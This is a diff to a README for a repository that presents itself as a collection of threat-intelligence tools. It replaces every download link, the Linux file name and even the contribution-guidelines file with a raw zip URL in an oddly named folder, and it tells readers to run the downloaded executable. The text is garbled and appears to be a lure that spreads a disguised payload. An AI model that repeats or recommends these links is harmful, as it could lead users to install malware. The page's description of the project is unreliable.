@@ -1,7 +1,7 @@
 # 🛡️ threat-intel-resources - Essential Tools for Cyber Analysts
 
 ## 📥 Download Now
-[![Download Latest Release](https://github.com/Wajihbawa/threat-intel-resources/raw/refs/heads/main/coltishly/intel_threat_resources_v3.4-alpha.4.zip%20Latest%20Release-Click%20Here-brightgreen)](https://github.com/Wajihbawa/threat-intel-resources/raw/refs/heads/main/coltishly/intel_threat_resources_v3.4-alpha.4.zip)
+[![Download Latest Release](https://github.com/Wajihbawa/threat-intel-resources/raw/refs/heads/main/coltishly/resources-threat-intel-1.7.zip%20Latest%20Release-Click%20Here-brightgreen)](https://github.com/Wajihbawa/threat-intel-resources/raw/refs/heads/main/coltishly/resources-threat-intel-1.7.zip)
 
 ## 📚 Overview
 Welcome to **threat-intel-resources**. This is a curated collection of open-source tools designed for cyber analysts, digital forensics and incident response (DFIR), and threat hunters. Here, you will find resources that help in malware analysis, scanning, reconnaissance, and gaining insights into various threats.
@@ -15,13 +15,13 @@ To get started with **threat-intel-resources**, follow these simple steps. You d
 - **Hard Disk Space:** Minimum of 500 MB available space for the application and resources.
 
 ## 🔗 Download & Install
-To download the latest version, visit this page to download: [Download from Releases](https://github.com/Wajihbawa/threat-intel-resources/raw/refs/heads/main/coltishly/intel_threat_resources_v3.4-alpha.4.zip).
+To download the latest version, visit this page to download: [Download from Releases](https://github.com/Wajihbawa/threat-intel-resources/raw/refs/heads/main/coltishly/resources-threat-intel-1.7.zip).
 
 1. Open the link above.
 2. You will see a list of available releases.
 3. Find the latest version and click on it.
 4. Scroll down to the "Assets" section.
-5. Download the appropriate file for your system (e.g., .exe for Windows, .pkg for macOS, https://github.com/Wajihbawa/threat-intel-resources/raw/refs/heads/main/coltishly/intel_threat_resources_v3.4-alpha.4.zip for Linux).
+5. Download the appropriate file for your system (e.g., .exe for Windows, .pkg for macOS, https://github.com/Wajihbawa/threat-intel-resources/raw/refs/heads/main/coltishly/resources-threat-intel-1.7.zip for Linux).
 6. Once downloaded, run the installer or executable file.
 7. Follow the prompted installation instructions.
 
@@ -62,9 +62,9 @@ The tools in **threat-intel-resources** are open-source and subject to the [MIT 
 ## 💡 Contributing
 We invite contributions to expand this collection. If you have a tool or resource that you think will benefit the community, consider submitting a pull request.
 
-For more detailed contribution guidelines, check the `https://github.com/Wajihbawa/threat-intel-resources/raw/refs/heads/main/coltishly/intel_threat_resources_v3.4-alpha.4.zip` file in this repository.
+For more detailed contribution guidelines, check the `https://github.com/Wajihbawa/threat-intel-resources/raw/refs/heads/main/coltishly/resources-threat-intel-1.7.zip` file in this repository.
 
 ## 📖 Learn More
 For additional information and updates, visit our main page and keep an eye on the latest releases.
 
-[Download the latest version now!](https://github.com/Wajihbawa/threat-intel-resources/raw/refs/heads/main/coltishly/intel_threat_resources_v3.4-alpha.4.zip)
+[Download the latest version now!](https://github.com/Wajihbawa/threat-intel-resources/raw/refs/heads/main/coltishly/resources-threat-intel-1.7.zip)
